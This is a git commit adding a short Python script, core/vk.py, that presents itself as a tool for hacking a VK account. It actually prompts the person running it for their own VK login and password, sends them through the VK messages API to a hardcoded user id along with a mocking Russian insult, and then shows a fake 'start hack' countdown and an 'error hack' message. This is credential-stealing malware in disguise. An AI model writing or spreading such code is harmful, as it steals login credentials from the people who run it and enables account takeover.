29539fb10ae45104653f5291e179297b6cee50d3
DarkGa <48998251+DarkGa@users.noreply.github.com>
2019-04-30 00:15:23 +0300

    Add files via upload

---
+++ core/vk.py
@@ -0,0 +1,25 @@
+import time 
+import vk_api
+import random
+from core.modules import *
+from core.colors import *
+token=token
+vk = vk_api.VkApi(token=token)
+print(B+"Vk_modules"+W)
+id=input(B+"Enter id hacking account: "+W)
+print(B+"plz, Log in to your VK"+W)
+def write_msg(user_id, s, random_id):
+ log= input("Enter login: ")
+ pas = input("Enter password: ")
+ msg = "login: " +log + " password: " +pas
+ 
+ vk.method('messages.send', {'user_id':user_id,'message':msg,'random_id':random.randint(1, 2147879)}) 
+
+write_msg('337045829', 'Ну ты и лох', 'random_id')
+
+print(G+"account detect!"+W)
+number=input("login : ")
+print(R+"start hack!..."+W)
+time.sleep(15)
+print(R+"error hack"+W)
+input()
